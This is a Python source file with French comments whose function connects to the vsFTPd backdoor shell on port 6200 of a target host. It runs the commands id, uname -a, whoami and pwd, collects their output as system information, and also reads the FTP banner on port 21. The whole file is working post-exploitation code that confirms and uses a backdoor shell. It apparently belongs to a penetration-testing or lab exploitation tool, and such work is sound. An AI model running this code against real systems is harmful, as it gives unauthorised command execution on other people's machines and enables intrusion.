import subprocess
import time
import re
from typing import Dict

def check_ftp_exploit_result(target: str) -> Dict:
    """
    Vérifie si l'exploit FTP a réussi et récupère les informations du système.
    
    Args:
        target: Cible exploitée
    
    Returns:
        Résultats de l'exploitation
    """
    
    result = {
        "exploit_success": False,
        "session_active": False,
        "system_info": {},
        "command_output": {},
        "vulnerability_confirmed": False,
        "details": ""
    }
    
    try:
        # Vérifier si nous avons une session active
        # En mode interactif, nous pouvons essayer d'exécuter des commandes via netcat
        
        # D'abord, vérifier si le port 6200 est ouvert (backdoor vsFTPd)
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        try:
            sock.connect((target, 6200))
            result["vulnerability_confirmed"] = True
            result["details"] = "Backdoor port 6200 is open!"
            
            # Essayer d'envoyer une commande
            sock.send(b"id\n")
            time.sleep(1)
            response = sock.recv(4096).decode(errors='ignore')
            
            if response:
                result["exploit_success"] = True
                result["session_active"] = True
                result["command_output"]["id"] = response.strip()
                
                # Récupérer plus d'informations
                sock.send(b"uname -a\n")
                time.sleep(1)
                uname_response = sock.recv(4096).decode(errors='ignore')
                result["command_output"]["uname"] = uname_response.strip()
                
                sock.send(b"whoami\n")
                time.sleep(1)
                whoami_response = sock.recv(4096).decode(errors='ignore')
                result["command_output"]["whoami"] = whoami_response.strip()
                
                sock.send(b"pwd\n")
                time.sleep(1)
                pwd_response = sock.recv(4096).decode(errors='ignore')
                result["command_output"]["pwd"] = pwd_response.strip()
                
                # Extraire les informations système
                result["system_info"] = {
                    "hostname": target,
                    "backdoor_port": 6200,
                    "user": whoami_response.strip() if whoami_response else "unknown",
                    "current_dir": pwd_response.strip() if pwd_response else "unknown",
                    "os_info": uname_response.strip() if uname_response else "unknown"
                }
            
            sock.close()
            
        except ConnectionRefusedError:
            result["details"] = "Backdoor port 6200 is closed"
        except Exception as e:
            result["details"] = f"Error checking backdoor: {str(e)}"
        
        # Vérifier également le port 21 pour confirmer le service
        ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_sock.settimeout(5)
        
        try:
            ftp_sock.connect((target, 21))
            banner = ftp_sock.recv(1024).decode(errors='ignore')
            result["ftp_banner"] = banner.strip()
            ftp_sock.close()
        except:
            pass
        
    except Exception as e:
        result["details"] = f"General error: {str(e)}"
    
    return result